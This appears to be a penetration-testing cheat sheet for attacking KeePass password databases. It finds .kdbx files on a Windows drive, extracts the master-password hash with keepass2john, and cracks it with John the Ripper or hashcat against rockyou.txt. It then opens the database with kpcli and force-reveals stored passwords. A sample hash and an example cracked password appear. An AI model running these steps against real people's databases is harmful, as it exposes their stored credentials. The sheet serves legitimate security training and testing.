# Locate a KeePass Database file
```bash
# Open Powershell and run:
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
![alt text](image-5.png)

## John the Ripper

```bash
# Step 1: Extract the hash
keepass2john FILE > hash.txt

#Example
keepass2john Database.kdbx > hash.txt
  
cat hash.txt                    
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

#NOTE: JTR automatically put the file name "Database" as the username of the hash. However in the instance of KeePass, it uses a master password without an associated username. So we need to remove it.

$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

# Step 2: Crack Extracted Hash

john EXTRACTED HASH FILE --wordlist=/usr/share/wordlists/rockyou.txt

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

#Or with Hashcat
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt --force

#Hashcat with Mutatated Wordlist
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force 

# NOTE: You can utilize Hashcat for this step. Its also worth noting this is not a traditional hash, so `hashid` command will not work. Instead search online or through hashcat -h or through Johns help file.
```
# Interacting With KeyPass via Terminal
```bash

#Navigate to database file location.

# Agnostic command
kpcli --kdb FILENAME.kdbx

#Example
kpcli --kdb Database.kdbx

#Input password
#Example
qwertyuiop123!
```

## Help

```bash

#Navigation is just like linux

  attach -- Manage attachments: attach <path to entry|entry number>
autosave -- Autosave functionality
      cd -- Change directory (path to a group)
      cl -- Change directory and list entries (cd+ls)
   clone -- Clone an entry: clone <path to entry> <path to new entry>
   close -- Close the currently opened database
     cls -- Clear screen ("clear" command also works)
    copy -- Copy an entry: copy <path to entry> <path to new entry>
    edit -- Edit an entry: edit <path to entry|entry number>
  export -- Export entries to a new KeePass DB (export <file.kdb> [<file.key>])
    find -- Finds entries by Title
     get -- Get a value: get <entry path|entry number> <field>
    help -- Print helpful information
 history -- Prints the command history
   icons -- Change group or entry icons in the database
  import -- Import a password database (import <file> <path> [<file.key>])
      ls -- Lists items in the pwd or specified paths ("dir" also works)
   mkdir -- Create a new group (mkdir <group_name>)
      mv -- Move an item: mv <path to a group|or entries> <path to group>
     new -- Create a new entry: new <optional path&|title>
    open -- Open a KeePass database file (open <file.kdb> [<file.key>])
     otp -- Show one-time password: otp <entry path|number>
  passwd -- Change the opened database's password
   purge -- Purges entries in a given group based on criteria.
    pwck -- Check password quality: pwck <entry|group>
     pwd -- Print the current working directory
    quit -- Quit this program (EOF and exit also work)
  rename -- Rename a group: rename <path to group>
      rm -- Remove an entry: rm <path to entry|entry number>
   rmdir -- Delete a group (rmdir <group_name>)
    save -- Save the database to disk
  saveas -- Save to a specific filename (saveas <file.kdb> [<file.key>])
     set -- Set a value: get <entry path|entry number> <field> <val>
    show -- Show an entry: show [-f] [-a] <entry path|entry number>
   stats -- Prints statistics about the open KeePass file
     ver -- Print the version of this program
    vers -- Same as "ver -v"
      xo -- Copy one-time password to clipboard: xo <entry path|number>
      xp -- Copy password to clipboard: xp <entry path|number>
     xpx -- Copy password to clipboard, with auto-clear: xpx <entry path|number>
      xu -- Copy username to clipboard: xu <entry path|number>
      xw -- Copy URL (www) to clipboard: xw <entry path|number>
      xx -- Clear the clipboard: xx

```

## Interesting Files

```bash
# Use the `show` command

show 2

# Information like passwords are protected. You can force show them with the -f flag

show -f 2

```
![alt text](image-3.png)

![alt text](image-4.png)